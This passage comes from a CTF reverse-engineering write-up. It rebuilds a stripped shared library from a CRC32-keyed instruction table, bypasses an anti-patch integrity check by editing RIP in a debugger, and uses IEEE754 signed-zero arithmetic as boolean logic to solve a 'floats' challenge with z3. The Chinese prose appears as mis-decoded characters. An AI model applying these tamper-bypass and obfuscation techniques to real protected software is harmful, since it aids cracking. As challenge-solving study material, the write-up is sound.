class="number">0xCABAC28A</span>, <span class="number">0x53B39330</span>, <span class="number">0x24B4A3A6</span>, <span class="number">0xBAD03605</span>, <span class="number">0xCDD70693</span>, <span class="number">0x54DE5729</span>, <span class="number">0x23D967BF</span>, <span class="number">0xB3667A2E</span>, <span class="number">0xC4614AB8</span>, <span class="number">0x5D681B02</span>, <span class="number">0x2A6F2B94</span>, <span class="number">0xB40BBE37</span>, <span class="number">0xC30C8EA1</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x2D02EF8D</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc32</span>(<span class="params">addr</span>):</span><br><span class="line">    addr32 = addr.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="built_in">sum</span>  = <span class="number">0xFFFFFFFF</span></span><br><span class="line">    mask = <span class="built_in">sum</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> addr32:</span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> &gt;&gt; <span class="number">8</span>) ^ CRC32_table[(<span class="built_in">sum</span> ^ x) &amp; <span class="number">0xFF</span>]</span><br><span class="line">        <span class="built_in">sum</span> &amp;= mask</span><br><span class="line">    <span class="keyword">return</span> ~<span class="built_in">sum</span> &amp; mask</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(crc32(0x483)))</span></span><br><span class="line"></span><br><span class="line">_inss = [ </span><br><span class="line">    ...</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">_inss = [_inss[<span class="number">0x18</span> * i:<span class="number">0x18</span> * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(_inss) // <span class="number">0x18</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(_inss[1])</span></span><br><span class="line"></span><br><span class="line">inss = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> ins <span class="keyword">in</span> _inss:</span><br><span class="line">    crc32sum = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(ins[:<span class="number">4</span>]), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="built_in">len</span> = ins[<span class="number">4</span>]</span><br><span class="line">    ins_code = <span class="built_in">bytearray</span>(ins[<span class="number">5</span>:<span class="number">5</span> + <span class="built_in">len</span>])</span><br><span class="line">    inss[crc32sum] = (<span class="built_in">len</span>, ins_code)</span><br><span class="line"></span><br><span class="line">old_so = <span class="built_in">open</span>(<span class="string">&#x27;.\lib.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">old_so = <span class="built_in">bytearray</span>(old_so)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0xA0</span></span><br><span class="line">bias = <span class="number">0xFFF</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0xB06</span>:</span><br><span class="line">    crc32sum = crc32(addr - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">len</span>, ins_code = inss[crc32sum]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    old_so[bias + addr:addr + <span class="built_in">len</span> + bias] = ins_code[:<span class="built_in">len</span>]</span><br><span class="line">    addr += <span class="built_in">len</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;.\lib_recovered.so&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(old_so)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ä¿®å¤åº“:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">dance_with_me</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2[<span class="number">49</span>]; <span class="comment">// [rsp+10h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3[<span class="number">12</span>]; <span class="comment">// [rsp+D4h] [rbp-6Ch] BYREF</span></span><br><span class="line">  __m128i v4; <span class="comment">// [rsp+E0h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+F0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+F8h] [rbp-48h]</span></span><br><span class="line">  _QWORD enc[<span class="number">6</span>]; <span class="comment">// [rsp+100h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+130h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+137h] [rbp-9h]</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  enc[<span class="number">0</span>] = <span class="number">0x6AAEAE66E85DE0B7</span>LL;</span><br><span class="line">  enc[<span class="number">1</span>] = <span class="number">0x7BB7CB57573A0FD9</span>LL;</span><br><span class="line">  enc[<span class="number">2</span>] = <span class="number">0x63F82FF80A9A46FE</span>LL;</span><br><span class="line">  enc[<span class="number">3</span>] = <span class="number">0x66F574F68BBC5E5C</span>LL;</span><br><span class="line">  enc[<span class="number">4</span>] = <span class="number">0xD56C69C511F19761</span>LL;</span><br><span class="line">  enc[<span class="number">5</span>] = <span class="number">0x2F6C8A362420DDDB</span>LL;</span><br><span class="line">  v8 = <span class="number">-2</span>;</span><br><span class="line">  v4.m128i_i64[<span class="number">0</span>] = <span class="number">0x9D474C0AEEB17B6C</span>LL;</span><br><span class="line">  v4.m128i_i64[<span class="number">1</span>] = <span class="number">0x40DD43D2BC5BD7ED</span>LL;</span><br><span class="line">  v5 = <span class="number">0x4B596E35B877B21D</span>LL;</span><br><span class="line">  v6 = <span class="number">0xDBED50E2D72663F8</span>LL;</span><br><span class="line">  *(_QWORD *)v3 = <span class="string">&#x27;\xBC\xFB|\x8E\xCA\xEB\xBF\x96&#x27;</span>;</span><br><span class="line">  *(_DWORD *)&amp;v3[<span class="number">8</span>] = <span class="string">&#x27;S\xA8r\xD9&#x27;</span>;</span><br><span class="line">  v10 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  sub_160A((__int64)v2, &amp;v4, (__int64)v3, <span class="number">0LL</span>);</span><br><span class="line">  v9 = anti_patch();</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;i&#x27;m dead&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    encrypt(v2, a1, v10);</span><br><span class="line">    <span class="keyword">return</span> v10 &lt;= <span class="number">0x30</span> || (<span class="type">unsigned</span> <span class="type">int</span>)cmp(a1, enc, <span class="number">49</span>) != <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ä¸€ä¸ªchacha20åŠ å¯† é«˜çº§ç‰ˆRC4 è‡ªå·±å†™ä¸€ä¸ªç¨‹åºæ¥åŠ¨æ€åŠ è½½å®ƒå¹¶ç”¨å¯†æ–‡å½“è¾“å…¥å°±èƒ½å¾—åˆ°æ˜æ–‡äº†:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> so_path[] = <span class="string">&quot;./lib_recovered.so\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> continue_flag;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;continue_flag);</span><br><span class="line">    <span class="type">void</span> *handle = dlopen(so_path, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(handle == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to load so\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">void</span> (*func)(<span class="type">char</span> *) = dlsym(handle, <span class="string">&quot;dance_with_me&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(func == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to load function\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x31</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0x30</span>, <span class="number">0x30</span>);</span><br><span class="line">    data[<span class="number">0x30</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;continue_flag);</span><br><span class="line">    func(data);</span><br><span class="line">    dlclose(handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶èƒ½å‘ç°ä¸ºä»€ä¹ˆä¹‹å‰ä¸èƒ½ç›´æ¥patchç¨‹åºæ¥è·å¾—åº“äº† åŠ è½½åº“æ—¶æ‰§è¡Œçš„å…¨å±€æ„é€ å‡½æ•°ä»¥åŠcheckå‡½æ•°ä¸­éƒ½å¯¹åŸç¨‹åºçš„å®Œæ•´æ€§è¿›è¡Œäº†éªŒè¯:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">anti_patch</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Ch] [rbp-2464h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+10h] [rbp-2460h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+101Ch] [rbp-1454h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+101Eh] [rbp-1452h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+1020h] [rbp-1450h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+102Bh] [rbp-1445h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+102Dh] [rbp-1443h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+1030h] [rbp-1440h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+1038h] [rbp-1438h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">5132</span>]; <span class="comment">// [rsp+1040h] [rbp-1430h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+244Ch] [rbp-24h]</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// [rsp+2450h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// [rsp+2458h] [rbp-18h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+2460h] [rbp-10h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+2468h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( fgets(s, <span class="number">5120</span>, stream) )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">      v14 = (<span class="type">int</span>)__isoc99_sscanf(s, <span class="string">&quot;%lx-%lx %s %lx %x:%x %u %s\n&quot;</span>, &amp;v9, &amp;v8, &amp;v6, &amp;v5, &amp;v3, &amp;v4, &amp;v1, &amp;v2);</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">114</span> &amp;&amp; v7 == <span class="number">120</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    v13 = sub_118C((_BYTE *)(v9 + <span class="number">256</span>), v8);</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="built_in">exit</span>();</span><br><span class="line">    v12 = sub_118C(v13 + <span class="number">16</span>, v8);</span><br><span class="line">    <span class="keyword">if</span> ( !v12 )</span><br><span class="line">      <span class="built_in">exit</span>();</span><br><span class="line">    v11 = crc32(v13, v12 - v13);</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">0x5285F228</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;i&#x27;m dead&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;i&#x27;m dead&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•æ—¶ä¿®æ”¹ä¸€ä¸‹RIPç›´æ¥ç»•è¿‡å³å¯ æœ€ååœ¨è°ƒç”¨encryptæ—¶å°†RSIæ”¹ä¸ºå¯†æ–‡åœ°å€å°±èƒ½åœ¨åŠ å¯†åå¾—åˆ°flagäº†</p>
<h1 id="C-style-float"><a href="#C-style-float" class="headerlink" title="C-style float"></a>C-style float</h1><p>ä¼—æ‰€å‘¨çŸ¥Cä¸­çš„æµ®ç‚¹æ•°æŒ‰ç…§IEEE754è§„åˆ™å­˜å‚¨åœ¨å†…å­˜ä¸­ è¿™é‡Œä¸ä»‹ç»å„ç§ç¥å¿…çš„æ•°å­¦ä¸Šçš„åŠ å¯†æ–¹å¼ åªä»‹ç»ä¸€äº›Cæµ®ç‚¹æ•°çš„æ€§è´¨</p>
<h2 id="0-0"><a href="#0-0" class="headerlink" title="-0.0"></a>-0.0</h2><p>å½“ä¸€ä¸ªæµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­å­˜æ”¾çš„å…¨éƒ¨å­—èŠ‚éƒ½æ˜¯<code>b&#39;\x00&#39;</code>æ—¶ æŒ‰ç…§IEEE754è§„åˆ™è¿™ä¸ªæµ®ç‚¹æ•°å°±æ˜¯<code>2^-126</code> ä½†æ˜¯å› ä¸ºæ˜¾ç¤ºç²¾åº¦æœ‰é™æ‰€ä»¥é€šå¸¸å°±è®¤ä¸ºæ˜¯0.0  åŒç†å½“ç¬¦å·ä½æ˜¯1æ—¶è¿™ä¸ªå€¼å°±æ˜¯-0.0 è¿™äº›éƒ½æ˜¯æ˜¾è€Œæ˜“è§çš„</p>
<p>ä½†æ˜¯å½“0.0å’Œ-0.0ä¹‹é—´è¿›è¡Œè¿ç®—æ—¶ç»“æœå°±è¶…å‡ºå¸¸ç†äº†</p>
<p>ç”¨ä»¥ä¸‹ä»£ç ç¼–è¯‘çš„ç¨‹åºéªŒè¯é™¤äº†é™¤æ³•è¿ç®—ä¹‹å¤–çš„ç»“æœ:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">float</span> fs[<span class="number">2</span>] = &#123;<span class="number">0.0</span>, <span class="number">-0.0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">        <span class="type">float</span> A = fs[i &amp;  <span class="number">1</span>];</span><br><span class="line">        <span class="type">float</span> B = fs[i &gt;&gt; <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.1f\t+\t%.1f\t=\t%.1f\n&quot;</span>, A, B, A+B);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">        <span class="type">float</span> A = fs[i &amp;  <span class="number">1</span>];</span><br><span class="line">        <span class="type">float</span> B = fs[i &gt;&gt; <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.1f\t-\t%.1f\t=\t%.1f\n&quot;</span>, A, B, A-B);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">        <span class="type">float</span> A = fs[i &amp;  <span class="number">1</span>];</span><br><span class="line">        <span class="type">float</span> B = fs[i &gt;&gt; <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.1f\t*\t%.1f\t=\t%.1f\n&quot;</span>, A, B, A*B);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœ:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0.0     +       0.0     =       0.0</span><br><span class="line">-0.0    +       0.0     =       0.0</span><br><span class="line">0.0     +       -0.0    =       0.0</span><br><span class="line">-0.0    +       -0.0    =       -0.0</span><br><span class="line">0.0     -       0.0     =       0.0</span><br><span class="line">-0.0    -       0.0     =       -0.0</span><br><span class="line">0.0     -       -0.0    =       0.0</span><br><span class="line">-0.0    -       -0.0    =       0.0</span><br><span class="line">0.0     *       0.0     =       0.0</span><br><span class="line">-0.0    *       0.0     =       -0.0</span><br><span class="line">0.0     *       -0.0    =       -0.0</span><br><span class="line">-0.0    *       -0.0    =       0.0</span><br></pre></td></tr></table></figure>

<p>å°†å…¶ä¸­çš„<code>-0.0</code>å’Œ<code>0.0</code>åˆ†åˆ«æ›¿æ¢ä¸º1å’Œ0 å°±èƒ½å°†æµ®ç‚¹æ•°çš„åŠ å‡ä¹˜è¿ç®—è½¬ä¸ºå¸ƒå°”è¿ç®—:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A + B ==&gt; A &amp;  B</span><br><span class="line">A - B ==&gt; A &amp; ~B</span><br><span class="line">A * B ==&gt; A ^  B</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨è¿™ä¸€ç‚¹ä»¥åŠç›®å‰çš„åæ±‡ç¼–å™¨éš¾ä»¥è¡¨ç°å‡ºè¿™ç±»æµ®ç‚¹æ•°ä¹‹é—´çš„è¿ç®—å°±èƒ½å®ç°å¯¹æŸäº›åŠ å¯†ç®—æ³•çš„éšè—</p>
<h3 id="WWCTF-floats"><a href="#WWCTF-floats" class="headerlink" title="[WWCTF floats]"></a>[WWCTF floats]</h3><p>é¢˜ç›®è¦æ±‚ä»å‘½ä»¤è¡Œä¼ å…¥é•¿åº¦ä¸º0x20çš„flag å…¶ä¸­æ¯0x10 bytesçš„flagä¼šè¢«è½¬ä¸º<code>__int128</code>ç„¶åè¿›è¡Œä¸€ç³»åˆ—å¤„ç† é¦–å…ˆæ˜¯æ ¹æ®æ¯ä¸€ä½æ¥åˆ›å»ºä¸€ä¸ªæµ®ç‚¹æ•° å¦‚æœè¿™ä¸€ä½æ˜¯0é‚£ä¹ˆè¿™ä¸ªæµ®ç‚¹æ•°å°±æ˜¯<code>-0.0</code>å¦åˆ™ä¸º<code>0.0</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">127</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( (flag1 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          v1 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">          v1 = <span class="number">-0.0</span>;</span><br><span class="line">    res[i] = v1;</span><br><span class="line">    flag1 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯¹è¿™äº›1ä½è¿›è¡Œäº†16è½®æŸç§å¤„ç†:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F02%2F20241202-170603.png" alt="image-20241202170556687"></p>
<p>æœ€åå¯¹ç»“æœä¸­çš„ä½ç›¸äº’è¿ç®—å¾—åˆ°ç»“æœ:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F02%2F20241202-170643.png" alt="image-20241202170643132"></p>
<p>æ˜¾ç„¶ç›´æ¥è¿›è¡Œé€†è¿ç®—å¾—åˆ°æ­£ç¡®flagååˆ†å›°éš¾ å…ˆçœ‹çœ‹æ±‡ç¼–:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F02%2F20241202-170733.png" alt="image-20241202170732989"></p>
<p>å¯ä»¥çœ‹åˆ°é™¤äº†ç§»åŠ¨æŒ‡ä»¤ä¹‹å¤–åªç”¨åˆ°äº†åŠ , å‡å’Œå¼‚æˆ–è¿ç®— æŒ‰ç…§ä¸Šé¢çš„ç»“è®ºç›´æ¥æ¨¡æ‹Ÿç¨‹åºçš„è¿è¡Œæ¥ç”¨z3è§£</p>
<p>å…ˆå¾—åˆ°ä¸¤ä¸ªcheckå‡½æ•°çš„æ±‡ç¼–:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x55555555528C</span></span><br><span class="line">end   = <span class="number">0x555555557EE9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;disasm_result.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;Disasm of Cheak1() :\n&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> start &lt; end:</span><br><span class="line">        f.write(GetDisasm(start) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        start = next_head(start, end)</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    start = <span class="number">0x555555557F0D</span></span><br><span class="line">    end   = <span class="number">0x555555558CE1</span></span><br><span class="line">    <span class="keyword">while</span> start &lt; end:</span><br><span class="line">        f.write(GetDisasm(start) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        start = next_head(start, end)</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    f.write(<span class="string">&quot;Disasm of Cheak2() :\n&quot;</span>)</span><br><span class="line">    start = <span class="number">0x555555558DEE</span></span><br><span class="line">    end   = <span class="number">0x55555555BA4B</span></span><br><span class="line">    <span class="keyword">while</span> start &lt; end:</span><br><span class="line">        f.write(GetDisasm(start) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        start = next_head(start, end)</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    start = <span class="number">0x55555555BA5F</span></span><br><span class="line">    end   = <span class="number">0x55555555C843</span></span><br><span class="line">    <span class="keyword">while</span> start &lt; end:</span><br><span class="line">        f.write(GetDisasm(start) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        start = next_head(start, end)</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œåˆæ­¥å¤„ç†å¾—åˆ°æ–¹ä¾¿æ‰§è¡Œçš„æŒ‡ä»¤:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;DisAsm_cheak2().txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;NewDisasm2.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        ins = f.readline()</span><br><span class="line">        <span class="keyword">while</span> ins:</span><br><span class="line">            ins = findall(<span class="string">r&#x27;[^\s,]+&#x27;</span>, ins)</span><br><span class="line">            new_ins = []</span><br><span class="line">            <span class="keyword">for</span> part <span class="keyword">in</span> ins:</span><br><span class="line">                <span class="keyword">if</span> part.startswith(<span class="string">&quot;res[&quot;</span>):</span><br><span class="line">                    num = findall(<span class="string">r&#x27;0x[0-9a-fA-F]+&#x27;</span>, part)[<span class="number">0</span>]</span><br><span class="line">                    hex_num = <span class="built_in">int</span>(num, <span class="number">16</span>)</span><br><span class="line">                    part = <span class="string">f&quot;res[<span class="subst">&#123;hex_num // <span class="number">4</span>&#125;</span>]&quot;</span></span><br><span class="line">                new_ins.append(part)</span><br><span class="line">            f1.write(<span class="string">&quot; &quot;</span>.join(new_ins) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            ins = f.readline()</span><br></pre></td></tr></table></figure>

<p>æ¨¡æ‹Ÿæ‰§è¡Œåç”¨z3è§£:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">NewPlus</span>(<span class="params">A, B</span>):</span><br><span class="line">    <span class="keyword">return</span> A &amp; B</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">NewMinus</span>(<span class="params">A, B</span>):</span><br><span class="line">    <span class="keyword">return</span> A &amp; ~B</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">res = [BitVec(<span class="string">&#x27;res&#x27;</span> + <span class="built_in">str</span>(i), <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">656</span>)]</span><br><span class="line">ans = res[:<span class="number">0x80</span>]</span><br><span class="line">xmm0 = BitVec(<span class="string">&#x27;xmm0&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">xmm1 = BitVec(<span class="string">&#x27;xmm1&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;NewDisasm1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ins = f.readline()</span><br><span class="line">    <span class="keyword">while</span> ins:</span><br><span class="line">        <span class="keyword">if</span> ins == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> count &lt; <span class="number">15</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;Round &#123;count&#125; is done.&quot;)</span></span><br><span class="line">            f.seek(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ins = ins.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">            op = ins[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&#x27;MOV&#x27;</span>:</span><br><span class="line">                <span class="built_in">exec</span>(<span class="string">f&quot;<span class="subst">&#123;ins[<span class="number">1</span>]&#125;</span> = <span class="subst">&#123;ins[<span class="number">2</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;ADD&#x27;</span>:</span><br><span class="line">                <span class="built_in">exec</span>(<span class="string">f&quot;<span class="subst">&#123;ins[<span class="number">1</span>]&#125;</span> = NewPlus(<span class="subst">&#123;ins[<span class="number">1</span>]&#125;</span>, <span class="subst">&#123;ins[<span class="number">2</span>]&#125;</span>)&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;SUB&#x27;</span>:</span><br><span class="line">                <span class="built_in">exec</span>(<span class="string">f&quot;<span class="subst">&#123;ins[<span class="number">1</span>]&#125;</span> = NewMinus(<span class="subst">&#123;ins[<span class="number">1</span>]&#125;</span>, <span class="subst">&#123;ins[<span class="number">2</span>]&#125;</span>)&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;XOR&#x27;</span>:</span><br><span class="line">                <span class="built_in">exec</span>(<span class="string">f&quot;<span class="subst">&#123;ins[<span class="number">1</span>]&#125;</span> = <span class="subst">&#123;ins[<span class="number">1</span>]&#125;</span> ^ <span class="subst">&#123;ins[<span class="number">2</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        ins = f.readline()</span><br><span class="line">    s.add(res[<span class="number">655</span>] == <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> s.check() == sat:</span><br><span class="line">        result 